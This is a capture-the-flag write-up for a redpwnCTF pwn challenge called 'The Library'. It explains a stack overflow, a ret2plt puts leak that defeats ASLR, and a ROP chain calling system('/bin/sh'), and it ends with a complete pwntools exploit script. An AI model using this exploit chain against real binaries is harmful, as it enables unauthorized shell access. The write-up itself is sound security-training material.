# The Library 

So, from the name and desc, as well as the fact you're provided with the libc binary, we know this is a ret2libc right off the bat. Inspecting the source code, we can see the read function is called into a 16-byte array, reading 0x100 bytes from stdin. This opens up a lot of room for overflow.

The array is stored at rbp-0x10, leaving 24 bytes of padding until our ROP chain.

We can use ret2plt to leak a libc address by calling the libc function puts via the PLT on the puts entry in the GOT, effectively printing a libc address back to ourselves. This works because there's no PIE in the binary, so the GOT and the PLT are stable.

So, we can first send padding + poprdi + puts@got + puts@plt + main so that the program calls puts on puts@got, sending us a libc address, and then rets back into main so we can get another input. On this second input, now that we know exactly where the libc is and have defeated ASLR, we send padding + poprdi + /bin/sh address + ret gadget + system address. This forces the program to call system("/bin/sh"), popping a shell for us. The ret gadget is needed to fix stack alignment.

```python
from pwn import *
import sys 
mode = sys.argv[1]
NUM_TO_RET = 0x10 + 8
padding = b'A' * NUM_TO_RET
poprdi = 0x0000000000400733 # pop rdi ; ret
retgadget = 0x0000000000400506 # ret
e = ELF("./library")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6" if mode == 'local' else './libc.so.6')
p = e.process() if mode == 'local' else remote('2020.redpwnc.tf', 31350)
p.recvline()
leak = flat(padding, poprdi, e.got['puts'], e.plt['puts'], e.symbols['main'], word_size=64)
p.sendline(leak)
p.recvlines(2)
output = p.recvline()[:-1] + b'\x00\x00'
puts = u64(output)
log.info(f"Puts address leak:  {hex(puts)}")
libcbase = puts - libc.symbols['puts']
libc.address = libcbase
log.info(f"Libc base: {hex(libcbase)}")
p.recvline()
final = flat(padding,poprdi,next(libc.search(b"/bin/sh\x00")),retgadget,libc.symbols['system'],word_size=64)
p.sendline(final)
p.interactive()
```
